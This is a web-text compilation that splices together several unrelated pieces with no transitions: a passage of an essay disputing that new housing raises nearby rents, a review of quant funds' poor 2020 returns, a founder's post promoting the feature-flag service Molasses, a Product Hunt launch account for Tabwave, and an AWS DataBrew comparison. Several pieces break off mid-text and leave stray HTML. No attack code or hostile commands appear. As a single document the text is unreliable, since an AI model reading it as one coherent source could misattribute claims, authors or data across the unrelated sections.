YIMBY proposal is in the first place.</p></li></ul><p>As I say, I don’t really believe that people believing in the induced demand argument explains any of the proximate barriers to housing reform. But it does come up a lot online, so I’d like to have a resource for explaining to people what’s wrong with it.</p><h4>The induced demand intuition</h4><p>The WMATA Green Line was extended to Columbia Heights in 1999, which meant that by 2003 a young person such as myself looking for a cheap place to live in a walkable neighborhood with good access to mass transit might pick it blindly off Google Maps and Craigslist as a good place to rent a basement apartment. </p><p>It was actually a fairly dismal neighborhood at the time, largely because the immediate vicinity of the metro station was a bunch of unsightly vacant lots and construction sites. But if you went to the no-longer-extant Columbia Heights Coffee Shop, all the talk among the gentrifiers was “there’s going to be a Target soon.” And, indeed, a few years later the construction sites were transformed into apartment buildings and retail, so if you go today, the immediate environs of the Metro station feature a Giant, a Target, a Best Buy, a Wawa, a Starbucks, and a bunch of other national chains along with some locally owned businesses. Then the slightly less proximate commercial areas either north on 14th Street or over on 11th Street are thriving ecologies of local businesses.     </p><p>There is clearly some kind of flywheel effect whereby the new retail amenities make the neighborhood a better place to live, which attracts more (and more affluent) residents, which in turn makes it a more attractive place to locate your business. </p><p>Now I think it’s obvious that the start of the Columbia Heights flywheel was the opening of the Green Line, especially given the largest context of falling urban crime during this period. The reason you could find white people in a coffee shop talking about how they were looking forward to the Target opening is that the gentrification cycle was already underway. Neighborhoods normally experience an initial hipster phase of gentrification (typified by dive bars, yoga studios, and independent coffee shops) <em>before</em> the major real estate developments and national chains arrive. </p><p>But we can argue intuitions all day — the real question is research.</p><h4>Empirically, more supply lowers prices</h4><p>Back when I wrote <em>The Rent Is Too Damn High</em>, I said that the impact of new development on hyper-local prices was theoretically ambiguous and the important thing was to look at city-wide effects that are not. </p><p>Fortunately, the past few years have seen a good amount of empirical work on this question. And it turns out that in most cases studied, new units reduce prices even on a very local scale. </p><ul><li><p><a href="https://www.dropbox.com/s/oplls6utgf7z6ih/Pennington_JMP.pdf?dl=0">Kate Pennington</a>’s recent study of San Francisco is very precise: “I find that rents fall by 2% for parcels within 100m of new construction. Renters’ risk of being displaced to a lower-income neighborhood falls by 17%. Both effects decay linearly to zero within 1.5km.”</p></li><li><p><a href="https://docs.wixstatic.com/ugd/7fc2bf_ee1737c3c9d4468881bf1434814a6f8f.pdf">Xiaodi Li</a> looked at New York: “For every 10% increase in the housing stock, rents decrease 1% and sales prices also decrease within 500 feet.”</p></li><li><p><a href="https://noahpinion.substack.com/p/the-left-nimby-canon">Brian Asquith, Evan Mast, and Davin Reed</a> look specifically at new market-rate housing in low-income neighborhoods in eleven cities and find: “New buildings decrease nearby rents by 5 to 7 percent relative to locations slightly farther away or developed later, and they increase in-migration from low-income areas.”</p></li></ul><p>There are some more studies along these lines, but I don’t want to inundate you with them because I do agree that the impact is theoretically ambiguous and someday, someone, somewhere will find the opposite result. </p><p>It is striking, though, that induced demand theory doesn’t yet have its Card &amp; Kruger paper that changed the game on the minimum wage. There is no Arin Dube of induced demand theory who’s published a series of rigorous empirical papers demonstrating that there’s something weird in this market. Instead you get this from Chew:</p><blockquote><p>Studies show that market-rate housing development is linked to the mass displacement of neighboring low-income residents (Davidson and Lees&nbsp;<a href="http://journals.sagepub.com/doi/10.1068/a3739">2005</a>,&nbsp;<a href="https://wordpress.clarku.edu/mdavidson/files/2012/02/Davidson-Lees-2010-New-Build-Gentrification.pdf">2010</a>; Pearsall&nbsp;<a href="http://journals.sagepub.com/doi/pdf/10.1068/c08126">2010</a>). Such displacement occurs even when low-income housing is not directly demolished and destroyed to make way for new development—because it operates through indirect and exclusionary means, such as “price shadowing” (Davidson and Lees&nbsp;<a href="http://journals.sagepub.com/doi/10.1068/a3739">2005</a>,&nbsp;<a href="https://wordpress.clarku.edu/mdavidson/files/2012/02/Davidson-Lees-2010-New-Build-Gentrification.pdf">2010</a>). Market-rate housing production causes significant price impacts in surrounding neighborhoods, raising area rents and real estate taxes (Oliva&nbsp;<a href="https://drum.lib.umd.edu/bitstream/handle/1903/4205/umi-umd-4016.pdf;sequence=1">2006</a>; Pearsall&nbsp;<a href="http://journals.sagepub.com/doi/pdf/10.1068/c08126">2010</a>; Zuk and Chapple&nbsp;<a href="http://www.urbandisplacement.org/sites/default/files/images/udp_research_brief_052316.pdf">2016</a>).&nbsp;</p></blockquote><p>So I checked the links.</p><p>The two Davidson and Lees papers are concerned with a definitional question in urban geography. According to them, the traditional meaning of gentrification in the literature is something like “rich people move into old homes and renovate them.” They argue that we should extend the definition to include things like new mixed-use housing and retail developments in underused industrial spaces. They <em>assert</em> but do not demonstrate that “price shadowing” occurs in these cases, and then argue that this sort of phenomenon ought to count as gentrification.</p><p><a href="https://www.urbandisplacement.org/sites/default/files/images/udp_research_brief_052316.pdf">Zuk and Chapple</a> actually say: “At the regional level, both market-rate and subsidized housing reduce displacement pressures, but subsidized housing has over double the impact of market-rate units.”</p><p>Pearsall says that cleaning up brownfields raises prices in nearby Census tracts, which is interesting and raises the question of whether “make people live near toxic waste” is really the affordable housing strategy we want. </p><p>Last we get to Oliva, who at last actually finds induced demand. He looks at the Inner Harbor project in Baltimore which transformed a largely derelict stretch of waterfront into a tourist attraction featuring a convention center, an amazing aquarium, a cool park, and a bunch of hotels and restaurants. Note that in this case promoting economic development was the intended goal of the initiative (Baltimore is poor) and the point of his study is that it was a limited success story — home values did rise, but “this impact has been far more pronounced on the prices of properties located within a short distance from the water even decades after the initial projects on the waterfront were started.”</p><p>This is all good empirical work. But note that I don’t think anyone has ever argued that building an aquarium will reduce housing cost burdens. The Inner Harbor is (by design) a tourist attraction. A couple of weeks ago, I took my kid to the Maryland Zoo in Baltimore, then we drove down to the Inner Harbor, got some takeout from Shake Shack, walked around waterfront, and bought a couple of bottles of water somewhere. This is what a successful tourist attraction is supposed to accomplish — you bring in retail dollars and tax revenue. We’ll come back post-pandemic and see the aquarium. It’s a nice place to visit. And Oliva shows that if you build a nice place to visit in the middle of a city, then the immediately adjacent homes become more desirable. Similarly, per Pearsall, if you clean up a brownfield the adjacent homes become more desirable.</p><p>New infill housing appears to empirically neutralize the induced demand by simultaneously inducing supply. But conceptually there’s a question here — is it bad to make neighborhoods better places to live? </p><h4>Better neighborhoods are better</h4><p>Here’s the problem. Consider the following argument:</p><ol><li><p>Constructing new buildings will bring new retail amenities to the neighborhood.</p></li><li><p>New amenities will make the neighborhood a more attractive place to live.</p></li><li><p>Because the neighborhood is now more attractive, prices will rise.</p></li><li><p>Rising prices will displace some existing residents.</p></li><li><p>Therefore we shouldn’t allow new buildings to be constructed.</p></li></ol><p>In place of (1) you could put all kinds of things:</p><ul><li><p>Constructing a new park</p></li><li><p>Reducing the crime rate</p></li><li><p>Renovating the local high school</p></li><li><p>Improving bus service to downtown</p></li><li><p>Fixing the potholes</p></li></ul><p>In other words, you could imagine this kind of logic becoming an infinite cycle of bad urban policy. Defund police will lead to more murders? Well, that’s good for housing affordability. …</p></div></div>

<p><span>2020, the most fascinating and boring year of my life, is over, and despite one of the most violent market crashes in history and the sharpest recession of all time, US equity investors clocked in another good year on the calendar. The S&amp;P 500 index finished the year up 18.4%; this despite being down by as much as 30% in March, making 2020 one of the wildest swinging markets in history.</span></p>

<p><span>But if you didn’t earn double digit returns last year you were in good company. The bull market was extremely concentrated in a narrow subset of stocks and most others floundered over the year. By my count, of the top 5,000 stocks trading on US exchanges (this includes over a thousand foreign stocks with US listings), only a little over half finished 2020 in positive territory and the median return was only 4.3%. If you didn’t have the good fortune to buy the few winners you were left behind, as happened with some of the industry’s best. Many of the world’s largest and previously most successful hedge funds and institutional money managers had a terrible 2020, including the top two: Ray Dalio’s Bridgewater Associates and Jim Simon’s Renaissance Technologies, each famous for their billionaire visionary founders, uniquely<span> <a href="https://www.bloomberg.com/news/articles/2019-11-12/the-unsolved-mystery-of-the-medallion-fund-s-success">secretive</a>/<a href="https://www.youtube.com/watch?v=HXbsVbFAczg">creepy</a></span> company culture, and astounding market-beating performance over decades, each suffered <em>negative double-digit</em> returns in their main funds in 2020. Similarly, some of the industry’s most highly regarded names such as <span><a href="https://www.institutionalinvestor.com/article/b1p9nxxx1d47xk/AQR-to-Liquidate-Some-Funds-After-Persistent-Outflows">AQR</a></span>, <a href="https://www.bloomberg.com/news/articles/2020-11-17/renaissance-two-sigma-see-losses-as-quant-giants-navigate-chaos"><span>Two Sigma</span></a>, and <span><a href="https://www.morningstar.com/articles/1012650/dfa-is-paying-the-price-for-its-conviction">Dimensional Fund Advisors</a></span> all suffered massive investor redemptions in the face of substantial underperformance in 2020.</span></p>
<p><span>All these fund managers pursue a variety of different strategies in a variety of different markets, but they all have one thing in common: they’re quants. They take a data-driven approach to investing, using mathematical models based typically on decades of market returns to execute their strategy, often employing teams of Ph.D mathematicians, computer scientists, and economists to crunch the numbers. They generally pay little attention to the “human interest” elements of investing like the executive bio or squishy concepts like “product market fit” or five year strategic plans. There are a lot of different ways to be a quant, but if you are one, or invested with one in 2020, you probably had a bad year. 2020 was the year of the swashbuckling stock-picker. As Bloomberg declared in a year-end article, <span><a href="https://www.bloomberg.com/news/articles/2020-12-30/human-run-hedge-funds-trounce-quants-in-year-defined-by-pandemic">Human-Run Hedge Funds Trounce Quants in Covid Year</a></span>. 2020 was the revenge&nbsp;<em>against</em> the nerds.</span></p>
<p><span>So what happened? Leo Tolstoy famously wrote, “All happy families are alike; each unhappy family is unhappy in its own way.” So it was with investing in 2020, there were many different investing strategies that went unhappily in 2020, and all the strategies that went happily looked pretty much the same. Let’s look at the unhappy families first and then return to the one thing that went well in 2020.</span></p>
<h3>Diversification</h3>
<p>2020 saw a repeat of something we’ve witnessed a few times in the last decade, not only did US stocks have an especially good year, they did substantially better than pretty much every other market. Investors who diversified across multiple asset classes therefore had much weaker returns.</p>
<p><a href="https://rhsfinancial.com/wp-content/uploads/2021/01/Asset-Class-Returns-2020.png"><img loading="lazy" src="https://rhsfinancial.com/wp-content/uploads/2021/01/Asset-Class-Returns-2020-1024x619.png" alt="" width="1024" height="619" srcset="https://rhsfinancial.com/wp-content/uploads/2021/01/Asset-Class-Returns-2020-200x121.png 200w, https://rhsfinancial.com/wp-content/uploads/2021/01/Asset-Class-Returns-2020-300x181.png 300w, https://rhsfinancial.com/wp-content/uploads/2021/01/Asset-Class-Returns-2020-400x242.png 400w, https://rhsfinancial.com/wp-content/uploads/2021/01/Asset-Class-Returns-2020-600x363.png 600w, https://rhsfinancial.com/wp-content/uploads/2021/01/Asset-Class-Returns-2020-768x464.png 768w, https://rhsfinancial.com/wp-content/uploads/2021/01/Asset-Class-Returns-2020-800x484.png 800w, https://rhsfinancial.com/wp-content/uploads/2021/01/Asset-Class-Returns-2020-1024x619.png 1024w, https://rhsfinancial.com/wp-content/uploads/2021/01/Asset-Class-Returns-2020-1200x726.png 1200w, https://rhsfinancial.com/wp-content/uploads/2021/01/Asset-Class-Returns-2020.png 1470w" sizes="(max-width: 1024px) 100vw, 1024px"></a></p>
<p><span>Just about the only major asset that beat the S&amp;P 500 last year was gold. The shiny metal held its weight during the crisis in March and powered through the rest of the year. Emerging market stocks also put in a solid year, virtually tied with the US market, despite suffering an even harder crash in March. Most other major assets, however, had much more modest returns, including the stock markets of most other rich, industrialized nations. Investors diversified across these major markets still likely had reasonably positive returns, but were a far cry from the meteoric rise of the S&amp;P 500.</span></p>
<p><span>Of course, how investors allocated both across and within these asset classes was of tantamount importance to their outcomes in 2020, and generally these outcomes frustrated quants at every turn. Whether picking stocks within a market or allocating across asset classes, quants often rely on measures of valuation, volatility, or momentum to guide their process, based on the historical success of these metrics in predicting returns, and in nearly every case following the numbers led investors astray in 2020, starting with perhaps the most time-tested of financial strategies, value investing.</span></p>
<h3><span>Value and Fundamentals</span></h3>
<p><span>For investors like yours truly who believe markets ultimately have to have some <span><a href="https://rhsfinancial.com/2020/08/11/does-reality-matter-stock-market-2020/">relation to reality</a></span>, the following joke tweet from December is a little too on the nose.</span></p>
<p><a href="https://rhsfinancial.com/wp-content/uploads/2021/01/F-Word.jpg"><img loading="lazy" src="https://rhsfinancial.com/wp-content/uploads/2021/01/F-Word.jpg" alt="" width="960" height="395" srcset="https://rhsfinancial.com/wp-content/uploads/2021/01/F-Word-200x82.jpg 200w, https://rhsfinancial.com/wp-content/uploads/2021/01/F-Word-300x123.jpg 300w, https://rhsfinancial.com/wp-content/uploads/2021/01/F-Word-400x165.jpg 400w, https://rhsfinancial.com/wp-content/uploads/2021/01/F-Word-600x247.jpg 600w, https://rhsfinancial.com/wp-content/uploads/2021/01/F-Word-768x316.jpg 768w, https://rhsfinancial.com/wp-content/uploads/2021/01/F-Word-800x329.jpg 800w, https://rhsfinancial.com/wp-content/uploads/2021/01/F-Word.jpg 960w" sizes="(max-width: 960px) 100vw, 960px"></a></p>
<p><span>Value investors ask the same seemingly reasonable question of investments we all ask when we’re considering buying a good or service: is the price I have to pay a good deal compared to the quality I’m getting? In practice this generally means value investors seek to buy assets whose prices are low relative to their cashflows or other economic fundamentals. Value investing has an intellectual pedigree going back to at least the 1920s with the classic writings of Graham and Dodd and is perhaps most famous for their most successful student, Warren Buffett (who also didn’t do so well last year). Value investing has been out of favor for several years now, especially in the US market, something I documented extensively in my <span><a href="https://rhsfinancial.com/2020/08/11/does-reality-matter-stock-market-2020/">two part</a> <a href="https://rhsfinancial.com/2020/08/19/does-reality-matter-part2/">series</a></span> last year on market valuations.</span></p>
<p><span>Last year was a miserable one for value investors. Within the US market, value stocks lagged the market in the first couple months, fell further during the crash, and recovered slower than the rest of the market. Though they rallied harder in the last two months of the year, value stock both large and small finished the year finished the year just barely above zero, as judged by the commonly followed Russell 1000 Value (large stocks) and Russell 2000 Value (small stocks) indexes.</span></p>

<p><span>Applying the value effect around the world gave even worse results. Choosing between stock markets, the US started the year the most expensive market in the world, and those in Europe were among the cheapest. But as we saw, the US market became more expensive still, and European stock investors barely ended the year in positive territory. Value stocks within foreign markets similarly failed to keep up with their broader market aggregates. One index of value stocks around the world, the MSCI ACWI Value Index, finished the year up a mere 0.42%. Taking an even more expansive view of valuation and applying it across global assets, buying those stocks, bonds, commodities, and currencies measured as cheap and selling those measured as expensive would have lost you about 12% in 2020 (through November) according to <span><a href="https://www.aqr.com/Insights/Datasets/Value-and-Momentum-Everywhere-Factors-Monthly">AQR’s methodology</a></span>.</span></p>
<p><span>Skeptics of value investing often point out that value stocks are usually cheap for a reason: they’re junk. Indeed, if you simply sort the market based on a simple valuation metric like price to book ratio you’ll often find that the most undervalued stocks are in declining industries, have weak balance sheets and margins, and are projected to lose market share. Value investors often try to avoid “value traps” like this by augmenting their value factors with metrics to score some measure of “quality”, looking at profitability measures like return on equity, for example. Adding such quality filters would have only made things worse in 2020. Among the cheapest stocks in the market, the most profitable among them did the worst last year.</span></p>
<p><span>Professor Ken French keeps an invaluable <span><a href="https://mba.tuck.dartmouth.edu/pages/faculty/ken.french/data_library.html">online database</a></span> to quants that records the track records to different portfolios of stocks sorted on a variety of metrics. Looking at a double-sorted portfolio of the stocks that are in the lowest quintile of valuation and the highest quintile of profitability, here’s how such a portfolio did last year (through November) compared to the S&amp;P 500.</span></p>
<p><a href="https://rhsfinancial.com/wp-content/uploads/2021/01/US-vs-High-Profit-Low-Value.png"><img loading="lazy" src="https://rhsfinancial.com/wp-content/uploads/2021/01/US-vs-High-Profit-Low-Value-1024x546.png" alt="" width="1024" height="546" srcset="https://rhsfinancial.com/wp-content/uploads/2021/01/US-vs-High-Profit-Low-Value-200x107.png 200w, https://rhsfinancial.com/wp-content/uploads/2021/01/US-vs-High-Profit-Low-Value-300x160.png 300w, https://rhsfinancial.com/wp-content/uploads/2021/01/US-vs-High-Profit-Low-Value-400x213.png 400w, https://rhsfinancial.com/wp-content/uploads/2021/01/US-vs-High-Profit-Low-Value-600x320.png 600w, https://rhsfinancial.com/wp-content/uploads/2021/01/US-vs-High-Profit-Low-Value-768x409.png 768w, https://rhsfinancial.com/wp-content/uploads/2021/01/US-vs-High-Profit-Low-Value-800x426.png 800w, https://rhsfinancial.com/wp-content/uploads/2021/01/US-vs-High-Profit-Low-Value-1024x546.png 1024w, https://rhsfinancial.com/wp-content/uploads/2021/01/US-vs-High-Profit-Low-Value-1200x639.png 1200w, https://rhsfinancial.com/wp-content/uploads/2021/01/US-vs-High-Profit-Low-Value.png 1490w" sizes="(max-width: 1024px) 100vw, 1024px"></a><span>The most profitable, cheapest stocks in the US lost more than half of their value in the crash last year, before recovering to end up down “only” about 20% last year, a staggering 33.8% behind the S&amp;P 500.</span></p>
<p><span>Take a moment to consider how counterintuitive this ought to seem. I think most people, even without much financial savvy, would consider the strategy of “buy highly profitable companies at attractive valuations” to seem like a fairly reasonable one, the sort of things that might actually deliver superior results over the long run, and indeed if we look at the long run data it has, as we’ll see further down the page. You might even suspect that such a prudent strategy might shine especially during a period of great economic tumult and uncertainty, and indeed it often has historically. But that is absolutely&nbsp;<em>not</em> what happened during the chaos of 2020. And that wasn’t the only curveball 2020 threw quants either.</span></p>
<h3><span>Low Volatility/Risk Parity</span></h3>
<p><span>After value, low volatility strategies are some of the most commonly used quant approaches of the last decade. Research going back to the 70s shows that those stocks whose prices are relatively more stable tend to roughly keep up with the rest of the market or nearly so when times are good, but lose far less value during panics and bear markets. Thus, over the long run they’ve done about as good or better as the rest of the market with a lot less risk. That is… decidedly not what happened last year. Within the US market, two of the most popular quant funds of recent years have been the iShares US Minimum Volatility ETF and the Invesco S&amp;P 500 Low Volatility ETF, two ETFs that use a quantitative approach to pick the least volatile stocks within the US market. With tens of billions of dollars between them, here’s how these two flavors of low volatility stock investing did last year.</span></p>

<h3>When the pipe bursts</h3>



<p>7am every Wednesday, it was time to release the code. I’d take a weeks worth of code that I knew nothing about, by 2 dozen people, and ship it to production. We tested the code in isolation. We tested it together in our lower environments.  But even then when it was up on production who knew what was going to happen. Even if the release itself went well, there was always a chance that a feature was not ready for users. Finding that out at the last minute could push a release to a later day. This would delay other important releases that teams worked hard on.</p>



<p> <br>By batching up releases, we thought we were doing everyone a favor.  Customer success only has to learn about the release once a week! One person can own the release process and be an authority on it! We can test everything together all at once, and know for sure that it will work!. We were so wrong. </p>



<p><br>By batching up releases, we introduced a ton of risk. The release became an all or nothing affair. If any feature in a release wasn’t ready for customers, everything we had already communicated to customers was at risk. We would mitigate that risk by creating new problems. Rushing through something or introducing new issues. </p>



<p><br>The person (me) who was doing the deployment had no context for what exactly I was deploying. Sure the steps we could document the steps and what was in the release. But if something went wrong,, all I knew I could do was stop the whole train. If anything broke, it was impossible to figure out what may have caused it. Even if you are an expert of a system, a week’s worth of work by 20+ people is impossible to isolate defects. </p>



<p><br>After a few too many stressful releases, we decided one of the best investments we could make quickly was feature flags. With feature flags, you separate the release of code to customers from the deployment to production. Code for a new feature can live in a production environment for any duration of time without disruption to your customer. When the feature is ready, any team member can turn it on. If there is an issue for any reason, Anyone can shut the feature off, limiting impact. </p>



<p><br>We saw improvements to our process right away.  We stopped batching deployments, instead we would deploy to production regularly. Each change getting sent to production was easy to discern, it could be as small as a couple lines of code. If there was an issue it would be easy to track and identify. </p>



<p><br>When a feature was  ready for customers, anyone on our team, especially our product owners, could turn it on. We even went further. To deliver value customers sooner, we could build smaller features and only release it to users who had no known edge cases.  Once we had more time to identify how to approach the edge cases those customers would receive the updates. Teams became more confident, less stressed, and could get feedback on their work in a much shorter timeframe. </p>



<p><br>This was a transformative experience for me. I’ve been preaching the gospel ever since. I knew I could help get teams to work faster by enabling feature flags for more teams. </p>



<p><br>That’s why I built Molasses. <br></p>

<p>I started building in June. I focused on the problems I saw with the current tools. I surveyed those who had used feature flagging and A/B testing services in the past to get their opinion. What I found was that while there are great solutions here and there, but there was space for improvement. </p>



<p><br>Despite being a developer focused tool,  so many feature flag services are developer hostile. They can be slow, and make blocking remote calls. They are naive in their ability to target users, sometimes only by IP address or one parameter.  They had no way to audit changes. They lacked integrations with platforms for planning, chatops or observability.   Teams are slow to remove feature flags, accumulating technical debt. The gaps in these feature flag systems are  filled with custom software. Taking away from expensive developer and operations resources. </p>



<p><br><a href="https://www.molasses.app/">Molasses</a> allows teams to get up and running with feature flags right away. It supports many different languages and frameworks.  Molasses’ clients are fast, non-blocking, and the service pushes updates to the client instantly, no waiting.  You can roll out features to specific users and target specific groups. Molasses lets teams focus on the features they are building, not building feature flag technology. </p>



<p><br>Molasses unlocks A/B testing. We can examine the effectiveness  of a change right away. Want to start rolling out a feature to a set of alpha or beta users? No problem! Molasses will let you adjust who receives a feature over time.</p>

<p><br>Molasses isn’t the only tool in your toolchain. It integrates with the systems you already use, like Datadog or Slack. You can use those updates to know if a recent change is causing issues. When your feature is finally rolled out, Molasses has the code clean itself up. It opens a PR in your Github repo removing any stale code. </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>Every time I used to visit Product Hunt, I would end up discovering a few awesome tools and products that make me say, wow! This is so cool. I want to build something like that. But the thing is I had no idea what to do. But I so wanted to build a product. I wanted to go through the process of building and shipping a product from scratch to end.</p>

<p>In late December, Hashnode announced  #ChristmasHackathon. And I decided to use it as a trigger to push myself to build something. I had few ideas so I started working and I built <strong>Tabwave</strong>. Well, I won't be discussing how and why I built it because I have already talked about it.  Check out  <a target="_blank" href="https://blog.rutikwankhade.dev/how-i-built-my-own-productivity-app">how I built my own productivity app</a> here.</p>
<p>I launched it last week on Product Hunt and it was the <strong><em>#5 Product of the day</em></strong> with 300+ upvotes. Also, it made it to the Product Hunt's <a target="_blank" href="https://www.producthunt.com/newsletter/7914">newsletter</a> too. For me, it was a 🏆 huge milestone.</p>
<p><a href="https://www.producthunt.com/posts/tabwave?utm_source=badge-top-post-badge&amp;utm_medium=badge&amp;utm_souce=badge-tabwave" target="_blank"><img src="https://api.producthunt.com/widgets/embed-image/v1/top-post-badge.svg?post_id=281905&amp;theme=dark&amp;period=daily" alt="Tabwave - Replace your new tab with a mindful productive app | Product Hunt"></a></p>

<p>I have learned a lot in these past few days about shipping products. So I am going to share my experience here.</p>
<h4 id="before-launch">🚀 Before launch</h4>
<h3 id="build-in-public">👩‍💻 Build in Public</h3>
<p>Keep sharing about your progress. It can be a tiny feature you added, a problem you faced, or a nasty bug you fixed. Share your wins and failures. Document everything. That will help you build your audience and create excitement among early users. And I feel Twitter is the best place for it.</p>
<p><em>Documenting your journey + Providing value</em> is the sweet spot I follow. Focus on providing as much value as you can.</p>
<h3 id="feedback-is-super-important">✨ Feedback is super important</h3>
<p>Feedback is the best thing that will help you and your product grow. The biggest example is Hashnode itself. See the <a target="_blank" href="https://hashnode.com/feature-requests">Feature Request</a> section of Hashnode. They listen to the community and give them exactly what they want. That's why we love it so much. So whatever you are building, share with the community. Ask for the feedback and make it better and better. </p>
<p>I collected feedback from the comments in my blog, from Reddit, from Twitter, anywhere from I could get people's hands on it. And that was a crucial thing. Not only they helped me find bugs, silly mistakes but suggested potential features.</p>
<h3 id="copywriting-is-a-skill">📰 Copywriting is a skill</h3>
<p>When I heard about copywriting for the first time I literally thought it means copying and writing. 😅 Yeah, I was that dumb. Copywriting is simply writing something in a way that makes the audience curious about it. It's more used in marketing and advertising stuff. </p>
<p>But wait? Why should I care about it. Well, whatever you build, Your goal is to reach more audiences. And in this high paced digital world, it's hard to grab attention in a little span of time. So use your words wisely. Learn how to write an effective copy.</p>
<h3 id="name-and-domain">🌐 Name and domain</h3>
<p>Before I started building Tabwave, I called it sorted. I loved that name a lot. Later I found out it's already taken. So I had to rename it to Tabwave, which is kind of cool too. That was the moment I realized why developers own so many domain names. Because they buy it even before starting to work the side project, which I think is a smart thing to do. </p>
<h3 id="landing-page">👨‍🚀 Landing page</h3>
<p>It's good to have a landing page for your product and a form to collect emails. 
<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1611594476374/5QoVVDtBW.png?auto=compress" alt="frame_chrome_mac_light (6).png">
My extension wasn't published so I collected emails to notify the users of its launch. So on the launch day, I had a list of 50+ people I could send mails to who are excited to check out my product.  </p>
<h4 id="launch-day">🚀 Launch day</h4>
<h3 id="product-hunt">🌀 Product Hunt</h3>
<p>Product Hunt is a global platform. Every day, a large number of products get launched by either individual makers or companies. Getting your product noticed isn't that easy. So the main goal is to get your product on the first page. Let's be honest, what was the last time you went on the 2nd page of your google search? rarely right! The same goes for Product Hunt.</p>
<p><em>I prepared everything like the description, screenshots, maker's comment, etc before and previewed using <a target="_blank" href="https://previewhunt.com/">Previewhunt</a>.</em></p>
<h3 id="timing-is-important">⌚ Timing is important</h3>
<p>All we get is 24 hrs. of PST <em>(Pacific Standard Time)</em> to show our product. Every day the list gets refreshed after 24 hours. I had no idea about this, glad I did some research before launch. The sooner you launch, the better. If you launch at around 12 am PST, it will get a longer exposure.</p>
<p>I launched Tabwave around 2 pm IST which is 12:30 am PST. I preferred Friday/Saturday as on weekends there is less competition which increased my chances to get featured.</p>
<p>For the first few hours, Tabwave was in 16th position but then it started getting upvotes and soon I could see it on the first page. </p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1611660991541/oXK88xPUQ.png?auto=compress" alt="Screenshot (491).png"></p>
<h4 id="after-launch">🚀 After launch</h4>
<h3 id="find-your-audience">👨‍👦‍👦 Find your audience.</h3>
<p>Building and launching is one thing but after that is the real game. i.e. Getting it into the hands of real users. Ask yourself, where does your audience hang out more. Is it Twitter? maybe Reddit? or something else?</p>
<p>I shared Tabwave everywhere I could think of like Twitter, Linkedin, relative Reddit channels, discord servers, communities like Indiehackers, Makerlog, etc.</p>
<blockquote>
<p>But please don't spam. </p>
</blockquote>
<p>If the product is good, people will more likely share it. However, it is suggested to share links to your landing page and not the Product Hunt page.</p>
<h3 id="engage-with-your-users">🙋‍♂️ Engage with your users</h3>
<p>For the next 24 hrs, I was available on all platforms. It was exciting. I was getting a good response. Engaging with the users, their feedbacks, and appreciations was overwhelming.</p>
<h3 id="monitor-the-stats">📈 Monitor the stats</h3>
<p>Wait, did you add analytics to your landing page? If not, you should. It will help you monitor the traffic and other stats. I was going to use google analytics but then I discovered  <a target="_blank" href="https://plausible.io/">Plausible</a>. I felt it's cleaner and much better than google analytics.</p>
<p>Here are the stats of Tabwave after a week.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1611813418999/zUgV72gW8.png?auto=compress" alt="Screenshot (493).png"></p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1611892562869/t03njCD1s.png?auto=compress" alt="tabwave (5).png"></p>
<h3 id="perks">🥳 Perks</h3>
<p>I have made awesome friends on Twitter, 100+ connections on Linkedin. And this week I have been approached by 5-6 folks with job opportunities that I haven't even applied for. </p>
<h3 id="summing-up">Summing up</h3>
<p>That's not everything. It was my first time. Tabwave was just a simple idea. I realized I can do better. There is a lot more to learn. A long way to go. It was a wonderful experience. And I am really excited to unfold what comes next. Everything I mentioned here is from my learning experience.  So give it a go, try different things, and keep growing.</p>
<p>I keep writing about the things I learned and applied.

<h3>DataBrew</h3>
<p name="17f1">AWS’s new data preparation tool belongs to the category of <em>no-code easy-to-use visual data-preparation engine</em><strong>.</strong> It is primarily purposed as a tool for <strong>cleaning, normalization, </strong>and <strong>profiling </strong>of data as well as <strong>automation of recipe jobs</strong>. It can be viewed as a <strong>standalone</strong> tool for data preparation but can be integrated within AWS’ ecosystem of tools and services such as S3 or other AWS data lakes and databases for storage, import, and export of unprepared/prepared data.</p>
</div>
<p name="d3dc">We decided to try out the platform to develop this article. Below is a screenshot of the ASW Glue DataBrew graphical user interface (GUI).&nbsp;</p>

<h3>Smart Data Preparation (The AI &amp; Analytics Engine)</h3>
<p name="4005">Within the AI &amp; Analytics Engine, Smart Data Preparation is a fully <strong>interactive</strong> feature that lets users prepare their data <strong>at scale </strong>in a <strong>flexible </strong>manner.&nbsp;</p>
<p name="b17a">The premise is that the user is guided by <strong>smart recommendations</strong> during the recipe-creation process. It offers a variety of “actions” (data transformation steps) through an <strong>action catalogue</strong> that offers the ability to fully customize and edit their data-preparation recipes. It covers the four stages of data preparation commonly required in analytics and machine learning tasks:&nbsp;</p>
<ol>
<li><strong>Cleaning</strong></li>
<li><strong>Structuring</strong></li>
<li><strong>Enriching&nbsp;</strong></li>
<li><strong>Feature engineering</strong></li>
</ol>
<p name="024d">Rather than a standalone tool, the Smart Data Preparation feature is a tightly integrated functionality within the end-to-end user journey on the AI &amp; Analytics Engine platform. It sits between the data import and app creation phases of the journey in a unified graphical user interface (GUI).</p>

<h3>Key Benefits: Its what you DON’T need to do</h3>
<p name="73ca">Smart Data Preparation on the AI &amp; Analytics Engine provides ease of use through the above seamless interface. In particular, there is:</p>
<ul>
<li>
<ul>
<li><strong>NO need to </strong>manually generate access tokens and turn on/off secure access of data between different tools</li>
<li><strong>NO need to </strong>manually set up S3 buckets or migrate all of their data into a single ecosystem such as AWS</li>
<li><strong>NO need to </strong>write scripts to manually orchestrate different components of the end-to-end pipeline</li>
</ul>
</li>
</ul>
</div>
<br>
<section name="fe3e">
<div>
<h2>Similarities</h2>
<p name="e0a5">The main similarity between the two tools is that they both cater to the need for an easy-to-use no-code interactive data preparation tool. Let's take a closer look:&nbsp;</p>
<h4>Data Ingestion and&nbsp;Outcome</h4>
<p name="f691">Both tools are targeted at tabular data files in the following formats: CSV, JSON (lines), and PARQUET.</p>
<p name="5fcd">While Data Brew allows the import of data mainly from data lakes on the AWS cloud such as S3, Redshift, and RDS — The Smart Data Preparation (AI &amp; Analytics Engine) allows a diverse set of options for importing data, such as HTTP (URLs), SQL and NoSQL databases. Users can still upload data from cloud storage services such as S3 or GCS (google cloud) by getting a pre-signed URL for their dataset and using the HTTP option.</p>
<p name="bd6a">The outcome of the recipe-building process is a re-runnable recipe that can be re-used to transform a larger dataset of the same input schema.</p>

</div>
<div>
<h4>Interactive Recipe Building and Recommender</h4>
